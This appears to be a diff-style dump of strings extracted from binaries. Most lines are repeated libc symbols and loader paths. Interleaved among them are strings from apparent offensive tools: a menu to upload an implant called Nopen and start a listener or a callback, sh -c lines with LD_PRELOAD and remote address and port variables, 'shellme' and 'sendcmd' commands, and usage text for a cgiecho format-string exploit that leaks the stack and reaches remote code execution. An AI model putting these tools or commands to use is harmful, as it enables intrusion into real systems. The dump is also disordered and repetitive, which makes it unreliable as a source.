+_get_exit_frame_monitor
+execve
+/libexec/ld-elf.so.1
+execve
+atexit
+execve
+exit
+atexit
+_exit
+execve
+execve
+exit
+execve
+exit
+execve
+exit
+/libexec/ld-elf.so.1
+execve
+atexit
+execve
+atexit
+execve
+exit
+execve
+exit
+execve
+exit
+execve
+exit
+/libexec/ld-elf.so.1
+execve
+atexit
+/libexec/ld-elf.so.1
+execve
+atexit
+execve
+exit
+execve
+exit
+execve
+exit
+/libexec/ld-elf.so.1
+execve
+atexit
+/libexec/ld-elf.so.1
+execve
+atexit
+/libexec/ld-elf.so.1
+execve
+atexit
+_exit
+atexit
+_get_exit_frame_monitor
+execve
+/libexec/ld-elf.so.1
+execve
+atexit
+execve
+exit
+atexit
+execve
+atexit
+_exit
+execve
+execve
+exit
+/libexec/ld-elf.so.1
+execve
+atexit
+_exit
+execve
+atexit
+atexit
+_exit
+execve
+execve
+atexit
+execve
+exit
+/libexec/ld-elf.so.1
+execve
+atexit
+execve
+exit
+/libexec/ld-elf.so.1
+execve
+atexit
+/libexec/ld-elf.so.1
+execve
+atexit
+execve
+exit
+execve
+exit
+execve
+exit
+execve
+exit
+execve
+exit
+/libexec/ld-elf.so.1
+execve
+atexit
+/libexec/ld-elf.so.1
+execve
+atexit
+/usr/libexec/ld-elf.so.1
+execve
+atexit
+execve
+exit
+execve
+exit
+execve
+exit
+execve
+exit
+/libexec/ld-elf.so.1
+execve
+atexit
+atexit
+_exit
+execve
+execve
+exit
+/libexec/ld-elf.so.1
+execve
+atexit
+execve
+exit
+execve
+exit
+_exit
+atexit
+_get_exit_frame_monitor
+execve
+/libexec/ld-elf.so.1
+execve
+atexit
+execve
+exit
+atexit
+execve
+/libexec/ld-elf.so.1
+execve
+atexit
+execve
+exit
+execve
+exit
+execve
+exit
+/libexec/ld-elf.so.1
+execve
+atexit
+execve
+_exit
+atexit
+execve
+exit
+execve
+exit
+execve
+exit
+atexit
+execve
+execve
+exit
+execve
+exit
+execve
+exit
+_exit
+execve
+atexit
+_exit
+execve
+atexit
+execve
+_exit
+atexit
+execve
+exit
+atexit
+_exit
+execve
+_exit
+execve
+atexit
+execve
+exit
+execve
+_exit
+atexit
+execve
+exit
+_exit
+atexit
+_get_exit_frame_monitor
+execve
+execve
+_exit
+atexit
+_exit
+execve
+atexit
+execve
+exit
+/libexec/ld-elf.so.1
+execve
+atexit
+execve
+exit
+execve
+exit
+atexit
+_exit
+execve
+execve
+exit
+_exit
+execve
+atexit
+/usr/libexec/ld-elf.so.1
+execve
+atexit
+execve
+exit
+execve
+exit
+execve
+exit
+execve
+exit
+execve
+_exit
+atexit
+execve
+exit
+execve
+exit
+execve
+exit
+execve
+exit
+/usr/libexec/ld-elf.so.1
+execve
+atexit
+/libexec/ld-elf.so.1
+execve
+atexit
+execve
+exit
+/libexec/ld-elf.so.1
+execve
+atexit
+execve
+exit
+/libexec/ld-elf.so.1
+execve
+atexit
+/libexec/ld-elf.so.1
+execve
+atexit
+/libexec/ld-elf.so.1
+execve
+atexit
+execve
+exit
+atexit
+execve
+execve
+exit
+/libexec/ld-elf.so.1
+execve
+atexit
+atexit
+_exit
+execve
+/usr/libexec/ld-elf.so.1
+execve
+atexit
+/usr/libexec/ld-elf.so.1
+execve
+atexit
+execve
+exit
+execve
+exit
+only ET_DYN and ET_EXEC can be loaded
+cannot enable executable stack as shared object requires
+cannot dynamically load executable
+Exec format error
+Cannot exec a shared library directly
+/libexec/ld-elf.so.1
+execve
+atexit
+execve
+exit
+execve
+exit
+execve
+exit
+execve
+exit
+execve
+exit
+/libexec/ld-elf.so.1
+execve
+atexit
+execve
+exit
+/libexec/ld-elf.so.1
+execve
+atexit
+execve
+exit
+execve
+exit
+execve
+exit
+_exit
+atexit
+_get_exit_frame_monitor
+execve
+atexit
+_exit
+execve
+/libexec/ld-elf.so.1
+execve
+atexit
+/usr/libexec/ld-elf.so.1
+__sys_nanosleep
+kse_exit
+atexit
+__sys_execve
+Sleeping
+Thread %p has called pthread_exit() from a destructor. POSIX 1003.1 1996 s16.2.5.2 does not allow this!
+Thread %p has exited with leftover thread-specific data after %d destructor iterations
+kse_exit() failed for system scope thread
+bound thread does not have SLEEP_WAIT state
+kse_exit() failed for initial kseg
+execve
+exit
+execve
+_exit
+atexit
+atexit
+_exit
+execve
+execve
+exit
+execve
+exit
+execve
+exit
+/libexec/ld-elf.so.1
+execve
+atexit
+execve
+exit
+execve
+exit
+/libexec/ld-elf.so.1
+execve
+atexit
+/libexec/ld-elf.so.1
+execve
+atexit
+/libexec/ld-elf.so.1
+execve
+atexit
+/usr/libexec/ld-elf.so.1
+__sys_nanosleep
+_thr_exit
+kse_exit
+atexit
+__sys_execve
+Sleeping
+Thread %p has called pthread_exit() from a destructor. POSIX 1003.1 1996 s16.2.5.2 does not allow this!
+Thread %p has exited with leftover thread-specific data after %d destructor iterations
+kse_exit() failed for system scope thread
+bound thread does not have SLEEP_WAIT state
+kse_exit() failed for initial kseg
+execve
+exit
+/libexec/ld-elf.so.1
+execve
+atexit
+execve
+exit
+execve
+exit
+_exit
+atexit
+_get_exit_frame_monitor
+execve
+execve
+exit
+execve
+exit
+execve
+_exit
+atexit
+execve
+exit
+atexit
+_exit
+execve
+execve
+exit
+execve
+exit
+/libexec/ld-elf.so.1
+execve
+atexit
+/libexec/ld-elf.so.1
+execve
+atexit
+execve
+exit
+execve
+exit
+/usr/libexec/ld-elf.so.1
+execve
+atexit
+execve
+_exit
+atexit
+/libexec/ld-elf.so.1
+execve
+atexit
+_exit
+execve
+atexit
+/libexec/ld-elf.so.1
+execve
+atexit
+execve
+exit
+/usr/libexec/ld-elf.so.1
+execve
+atexit
+execve
+_exit
+atexit
+execve
+exit
+/libexec/ld-elf.so.1
+execve
+atexit
+execve
+exit
+execve
+exit
+/libexec/ld-elf.so.1
+execve
+atexit
+execve
+_exit
+atexit
+execve
+_exit
+atexit
+execve
+exit
+/libexec/ld-elf.so.1
+execve
+atexit
+execve
+exit
+execve
+exit
+/libexec/ld-elf.so.1
+execve
+atexit
+/libexec/ld-elf.so.1
+execve
+atexit
+execve
+exit
+execve
+exit
+/libexec/ld-elf.so.1
+execve
+atexit
+/libexec/ld-elf.so.1
+execve
+atexit
+/usr/libexec/ld-elf.so.1
+execve
+atexit
+/usr/libexec/ld-elf.so.1
+execve
+atexit
+/libexec/ld-elf.so.1
+execve
+atexit
+execve
+exit
+/libexec/ld-elf.so.1
+execve
+atexit
+/usr/libexec/ld-elf.so.1
+execve
+atexit
+execve
+exit
+execve
+exit
+_exit
+execve
+atexit
+execve
+exit
+/libexec/ld-elf.so.1
+execve
+atexit
+execve
+_exit
+atexit
+_exit
+atexit
+_get_exit_frame_monitor
+execve
+execve
+exit
+execve
+exit
+/libexec/ld-elf.so.1
+execve
+atexit
+execve
+exit
+execve
+exit
+atexit
+execve
+execve
+exit
+only ET_DYN and ET_EXEC can be loaded
+cannot enable executable stack as shared object requires
+cannot dynamically load executable
+Exec format error
+Cannot exec a shared library directly
+execve
+exit
+/usr/libexec/ld-elf.so.1
+__sys_nanosleep
+_thr_exit
+kse_exit
+atexit
+__sys_execve
+Thread %p has called pthread_exit() from a destructor. POSIX 1003.1 1996 s16.2.5.2 does not allow this!
+Thread %p has exited with leftover thread-specific data after %d destructor iterations
+bound thread does not have SLEEP_WAIT state
+kse_exit() failed for system scope thread
+kse_exit() failed for initial kseg
+/libexec/ld-elf.so.1
+execve
+atexit
+execve
+exit
+execve
+atexit
+execve
+exit
+/libexec/ld-elf.so.1
+execve
+atexit
+/libexec/ld-elf.so.1
+execve
+atexit
+atexit
+_exit
+execve
+_exit
+execve
+atexit
+execve
+_exit
+atexit
+execve
+exit
+execve
+exit
+/usr/libexec/ld-elf.so.1
+__sys_nanosleep
+_thr_exit
+kse_exit
+atexit
+__sys_execve
+Thread %p has called pthread_exit() from a destructor. POSIX 1003.1 1996 s16.2.5.2 does not allow this!
+Thread %p has exited with leftover thread-specific data after %d destructor iterations
+bound thread does not have SLEEP_WAIT state
+kse_exit() failed for system scope thread
+kse_exit() failed for initial kseg
+execve
+exit
+execve
+exit
+/libexec/ld-elf.so.1
+execve
+atexit
+execve
+atexit
+/libexec/ld-elf.so.1
+execve
+atexit
+execve
+exit
+execve
+exit
+/libexec/ld-elf.so.1
+execve
+atexit
+execve
+exit
+execve
+_exit
+atexit
+/libexec/ld-elf.so.1
+execve
+atexit
+atexit
+_exit
+execve
+_exit
+execve
+atexit
+execve
+atexit
+/usr/libexec/ld-elf.so.1
+execve
+atexit
+execve
+atexit
+execve
+exit
+execve
+exit
+atexit
+_exit
+execve
+/libexec/ld-elf.so.1
+execve
+atexit
+execve
+exit
+/libexec/ld-elf.so.1
+execve
+atexit
+execve
+exit
+execve
+exit
+execve
+exit
+/libexec/ld-elf.so.1
+execve
+atexit
+execve
+exit
+/libexec/ld-elf.so.1
+execve
+atexit
+atexit
+execve
+_exit
+execve
+atexit
+/libexec/ld-elf.so.1
+execve
+atexit
+/libexec/ld-elf.so.1
+execve
+atexit
+_exit
+execve
+atexit
+execve
+_exit
+atexit
+execve
+exit
+atexit
+_exit
+execve
+_exit
+execve
+atexit
+atexit
+_exit
+execve
+execve
+exit
+only ET_DYN and ET_EXEC can be loaded
+cannot enable executable stack as shared object requires
+cannot dynamically load executable
+Exec format error
+Cannot exec a shared library directly
+/libexec/ld-elf.so.1
+execve
+atexit
+execve
+exit
+atexit
+_exit
+execve
+/libexec/ld-elf.so.1
+execve
+atexit
+_exit
+atexit
+_get_exit_frame_monitor
+execve
+__1cG__CrunMdo_exit_code6F_v_
+/usr/libexec/ld-elf.so.1
+execve
+atexit
+_exit
+execve
+atexit
+execve
+exit
+/usr/libexec/ld-elf.so.1
+execve
+atexit
+execve
+exit
+execve
+exit
+execve
+exit
+/libexec/ld-elf.so.1
+execve
+atexit
+/libexec/ld-elf.so.1
+execve
+atexit
+execve
+exit
+execve
+exit
+execve
+exit
+/libexec/ld-elf.so.1
+execve
+atexit
+execve
+exit
+execve
+exit
+/usr/libexec/ld-elf.so.1
+execve
+atexit
+/libexec/ld-elf.so.1
+execve
+atexit
+execve
+exit
+execve
+exit
+execve
+exit
+execve
+_exit
+atexit
+_exit
+execve
+atexit
+execve
+exit
+execve
+exit
+execve
+exit
+atexit
+_exit
+execve
+/usr/libexec/ld-elf.so.1
+execve
+atexit
+execve
+exit
+execve
+exit
+/libexec/ld-elf.so.1
+execve
+atexit
+execve
+exit
+/usr/libexec/ld-elf.so.1
+execve
+atexit
+_exit
+execve
+atexit
+/libexec/ld-elf.so.1
+execve
+atexit
+execve
+exit
+execve
+exit
+execve
+_exit
+atexit
+execve
+exit
+/libexec/ld-elf.so.1
+execve
+atexit
+execve
+exit
+execve
+exit
+/usr/libexec/ld-elf.so.1
+execl
+sleep
+regexec
+atexit
+_exit
+execvp
+execl
+sleep
+regexec
+exit
+_exit
+execvp
+/usr/libexec/ld-elf.so.1
+execl
+sleep
+regexec
+atexit
+_exit
+execvp
+sleep
+_exit
+atexit
+execl
+execvp
+regexec
+Exec format error
+execvp: 
+mapping information
+Cannot exec a shared library directly
+Exec format error
+__libc_atexit
+execl
+sleep
+execlp
+_exit
+execvp
+ server will execute:
+      bytes: mapping %d, 
+down/cmdout
+-exit
+-quit
+-help
+-shell
+-upload
+-cmdout
+-ping
+ (should add help)
+       -ping host
+       -ping [-u|-t|-i] host
+exiting...
+Executing: %s %s
+Noclient: Command we are executing... %s ...
+" >> /current/down/cmdout/scans
+Resource issues, sleeping.....
+sendcmd
+  <cmd_output id="%d">
+  </cmd_output>
+  <cmd_started txid="%d" id="%d" pid="-1">
+  </cmd_started>
+  <cmd_ended id="%d" />
+Done shelling, range shutting down
+ping -c 1 -w 1 %s >/dev/null
+Ping string: %s
+Ping error (Got [8] bytes)
+	[1] Upload Nopen and start listener
+	[2] Upload Nopen and do callback
+	[4] Upload Nopen, using incision and ftshell, and do a callback
+xterm -hold -e sh -c 'RA=%s RP=%u LD_PRELOAD=../bin/connect.so CMD="%s" 
+Which port will we be uploading nopen on?  
+	[5] Exit
+sh -c 'UTC_OFFSET=%d RA=%s RP=%u CMD="%s" NOPENJACK=yes 
+sh -c 'RA=%s RP=%u LD_PRELOAD=../bin/connect.so CMD="%s" 
+Nopen to upload[] 
+	Nopen upload port [%d]
+	File to upload [%s]
+sh -c "ping -c 2 %s; grep %s /proc/net/arp >/tmp/gx "
+Type DONE to quit -rawsend
+Ping error, closeing down
+exit
+got this from shell: %s
+/libexec/ld-elf.so.1
+execl
+sleep
+regexec
+atexit
+_exit
+execvp
+/usr/libexec/ld.so
+execl
+sleep
+regexec
+atexit
+_exit
+execvp
+sendcmd
+shellme
+/usr/libexec/ld.so
+execl
+sleep
+regexec
+atexit
+exit
+_exit
+execvp
+sendcmd
+shellme
+execl
+sleep
+execlp
+_exit
+execvp
+ server will execute:
+      bytes: mapping %d, 
+down/cmdout
+-exit
+-quit
+-help
+-shell
+-upload
+-cmdout
+-ping
+ (should add help)
+       -ping host
+       -ping [-u|-t|-i] host
+exiting...
+Executing: %s %s
+Noclient: Command we are executing... %s ...
+" >> /current/down/cmdout/scans
+Resource issues, sleeping.....
+sendcmd
+  <cmd_output id="%d">
+  </cmd_output>
+  <cmd_started txid="%d" id="%d" pid="-1">
+  </cmd_started>
+  <cmd_ended id="%d" />
+Done shelling, range shutting down
+ping -c 1 -w 1 %s >/dev/null
+Ping string: %s
+Ping error (Got [8] bytes)
+Nopen to upload[] 
+	Nopen upload port [%d]
+	File to upload [%s]
+	[1] Upload Nopen and start listener
+	[2] Upload Nopen and do callback
+	[4] Upload Nopen, using incision and ftshell, and do a callback
+xterm -hold -e sh -c 'RA=%s RP=%u LD_PRELOAD=../bin/connect.so CMD="%s" 
+Which port will we be uploading nopen on?  
+	[5] Exit
+sh -c 'UTC_OFFSET=%d RA=%s RP=%u CMD="%s" NOPENJACK=yes 
+sh -c 'RA=%s RP=%u LD_PRELOAD=../bin/connect.so CMD="%s" 
+sh -c "ping -c 2 %s; grep %s /proc/net/arp >/tmp/gx "
+Ping error, closeing down
+exit
+got this from shell: %s
+execl
+sleep
+regexec
+exit
+_exit
+execvp
+execl
+sleep
+execlp
+_exit
+execvp
+ server will execute:
+      bytes: mapping %d, 
+down/cmdout
+-exit
+-quit
+-help
+-shell
+-upload
+-cmdout
+-ping
+ (should add help)
+       -ping host
+       -ping [-u|-t|-i] host
+exiting...
+Executing: %s %s
+Noclient: Command we are executing... %s ...
+" >> /current/down/cmdout/scans
+Resource issues, sleeping.....
+sendcmd
+  <cmd_output id="%d">
+  </cmd_output>
+  <cmd_started txid="%d" id="%d" pid="-1">
+  </cmd_started>
+  <cmd_ended id="%d" />
+Done shelling, range shutting down
+ping -c 1 -w 1 %s >/dev/null
+Ping string: %s
+Ping error (Got [8] bytes)
+Nopen to upload[] 
+	Nopen upload port [%d]
+	File to upload [%s]
+	[1] Upload Nopen and start listener
+	[2] Upload Nopen and do callback
+	[4] Upload Nopen, using incision and ftshell, and do a callback
+xterm -hold -e sh -c 'RA=%s RP=%u LD_PRELOAD=../bin/connect.so CMD="%s" 
+Which port will we be uploading nopen on?  
+	[5] Exit
+sh -c 'UTC_OFFSET=%d RA=%s RP=%u CMD="%s" NOPENJACK=yes 
+sh -c 'RA=%s RP=%u LD_PRELOAD=../bin/connect.so CMD="%s" 
+sh -c "ping -c 2 %s; grep %s /proc/net/arp >/tmp/gx "
+Ping error, closeing down
+exit
+got this from shell: %s
+execvp
+atexit
+_exit
+exit
+sleep
+execl
+Exec format error
+Can not exec a shared library directly
+No sleeping in stream head of pipe/FIFO
+atexit
+_exit
+exit
+regexec
+execl
+sleep
+execvp
+execvP: 
+warning, unknown root shell
+/etc/shells
+shells-XXXXX
+shells-%d
+initshells
+mapping information
+Exec format error
+$FreeBSD: src/lib/libc/gen/sleep.c,v 1.31 2002/02/01 00:57:29 obrien Exp $
+$FreeBSD: src/lib/libc/regex/regexec.c,v 1.6 2004/07/12 07:35:59 tjr Exp $
+$FreeBSD: src/lib/libc/gen/exec.c,v 1.22 2003/07/01 12:30:03 bde Exp $
+$FreeBSD: src/lib/libc/gen/getusershell.c,v 1.9 2003/04/24 20:16:21 nectar Exp $
+$FreeBSD: src/lib/libc/locale/fix_grouping.c,v 1.8 2003/06/26 10:46:16 phantom Exp $
+$FreeBSD: src/lib/libc/stdlib/exit.c,v 1.7 2003/12/19 17:11:20 kan Exp $
+$FreeBSD: src/lib/libc/stdlib/atexit.c,v 1.7 2003/12/19 17:11:20 kan Exp $
+$FreeBSD: src/lib/libc/gen/usleep.c,v 1.28.12.1 2005/10/08 17:56:53 delphij Exp $
+sendcmd
+shellme
+execl
+execle
+execlp
+execvp: 
+execvp
+mapping information
+Exec format error
+$OpenBSD: exit.c,v 1.9 2003/06/02 20:18:37 millert Exp $
+$OpenBSD: atexit.c,v 1.7 2002/09/14 22:03:14 dhartmei Exp $
+$OpenBSD: sleep.c,v 1.9 2003/06/25 21:15:04 deraadt Exp $
+$OpenBSD: regexec.c,v 1.8 2003/06/02 20:18:36 millert Exp $
+$OpenBSD: exec.c,v 1.16 2003/06/11 21:03:10 deraadt Exp $
+$OpenBSD: usleep.c,v 1.8 2003/06/02 20:18:35 millert Exp $
+exit 0
+Cannot exec a shared library directly
+Exec format error
+__libc_atexit
+execvp: 
+Exec format error
+mapping information
+sendcmd
+shellme
+execl
+execle
+execlp
+execvp
+execvp: 
+$OpenBSD: exit.c,v 1.10 2005/03/30 18:51:49 pat Exp $
+mapping information
+Exec format error
+$OpenBSD: atexit.c,v 1.8 2005/03/30 18:51:49 pat Exp $
+$OpenBSD: sleep.c,v 1.10 2004/05/18 02:05:52 jfb Exp $
+$OpenBSD: regexec.c,v 1.10 2004/11/30 17:04:23 otto Exp $
+$OpenBSD: exec.c,v 1.17 2005/03/25 15:38:47 otto Exp $
+<$OpenBSD: usleep.c,v 1.9 2004/05/18 02:05:52 jfb Exp $
+execvp: 
+Exec format error
+mapping information
+exit 0
+regexec.c
+nscd_helper.c
+Exec format error
+Cannot exec a shared library directly
+cannot dynamically load executable
+cannot enable executable stack as shared object requires
+only ET_DYN and ET_EXEC can be loaded
+__libc_atexit
+Cannot exec a shared library directly
+Exec format error
+__libc_atexit
+execvp: 
+Exec format error
+mapping information
+/usr/libexec/ld-elf.so.1
+execl
+sleep
+regexec
+atexit
+exit
+_exit
+execvp
+/usr/libexec/ld-elf.so.1
+execl
+sleep
+regexec
+atexit
+exit
+_exit
+execvp
+/usr/libexec/ld-elf.so.1
+execl
+sleep
+regexec
+atexit
+exit
+_exit
+execvp
+sleep
+atexit
+exit
+execl
+_exit
+execvp
+regexec
+sleep
+atexit
+exit
+execl
+_exit
+execvp
+regexec
+sleep
+re_exec
+atexit
+exit
+execl
+_exit
+execvp
+regexec
+re_exec
+regexec
+execvp
+execl
+exit
+_exit
+sleep
+sleep
+atexit
+exit
+execl
+_exit
+execvp
+regexec
+Exec format error
+Cannot exec a shared library directly
+execl
+sleep
+regexec
+exit
+_exit
+execvp
+sleep
+exit
+execl
+_exit
+execvp
+regexec
+atexit
+execl
+sleep
+regexec
+exit
+_exit
+execvp
+regexec
+execl
+sleep
+_exit
+execvp
+/libexec/ld-elf.so.1
+execl
+sleep
+regexec
+atexit
+_exit
+execvp
+sleep
+_exit
+atexit
+execl
+execvp
+regexec
+sleep
+_exit
+atexit
+execl
+execvp
+regexec
+execl
+sleep
+regexec
+exit
+_exit
+execvp
+atexit
+_exit
+exit
+regexec
+execl
+sleep
+execvp
+sleep
+_exit
+atexit
+execl
+execvp
+regexec
+regexec
+execl
+sleep
+_exit
+execvp
+/libexec/ld-elf.so.1
+execl
+sleep
+regexec
+atexit
+_exit
+execvp
+help
+SUEXEC=""
+for x in /usr/local/apache/bin/suexec{,.disable}
+    SUEXEC="$x"
+if [ "$SUEXEC" ]
+cat <<"WdURzA" | "$SUEXEC" mailman mailman config_list -c -i /dev/stdin mailman
+execve() filename required.
+prepare_shellcode_fork_exec.c
+help
+execve() filename and/or executable image required.
+prepare_python_fork_exec.c
+Unable to encode executable.
+Usage: %s [--suexec] [--no-base64] [--filename <remote/path/to/exe>] [--executable <local/path/to/exe>] [--stdin <local/path/to/file to put on stdin>] [--argv argv[0] argv[1] ...] [--envp envp[0] envp[1] ...]
+--via-suexec
+--executable
+Filename and/or executable required.
+  sys.exit()
+   os.execve(fn, av, ev)
+    from time import sleep
+    sleep(sc)
+  print 'exec'
+sys.exit()
+(leak_stack) Found return address 0x%08llx at offset %d: identified '%s' executable.
+(leak_stack) No known return address found in stack data: unidentified executable.
+(leak_stack) Executable could not be identified: no target exe dict.
+Unable to set upload option.
+Unable to set upload size.
+Unable to force upload to use GET method.
+Exploit for cgiecho (part of cgiemail) giving info disclosure and memory read/write, enabling remote code execution.
+   the user full control, useful for exploring how a particular executable processes the file.
+   Exploit fprintf() to leak data from the stack. Can be used to fingerprint the target executable
+   If the symbol does not specify the target executable then "this" executable, as determined
+   Specifies a file containing name value mappings for known target executables.
+   Required if --leak-stack is to automatically determine the target executable,
+   Specifies the target executable, if known, using a name from the target exe dict.
+   This allows a guess of 78 (+10=88) to cover the three known 32-bit cPanel cgiecho executables.
+   can be avoided, and execution can potentially be gained with a single request.
+   Specifies the target word size (in bytes) of the target executable. The word size must be known for
+   processed template file. A first-stage shellcode can rewind() the file and read the payload.
+ # Do a GET request, dump stack to determine offset of format string and identify target executable:
+ # With known/guessed stack offset and word size, read copy of target executable from memory:
+ echo -n '[$exec $0<&4 2>&1]' > trigger
+Try --help for more information.
+help
+Cannot resolve symbol '%s': target executable is undetermined.
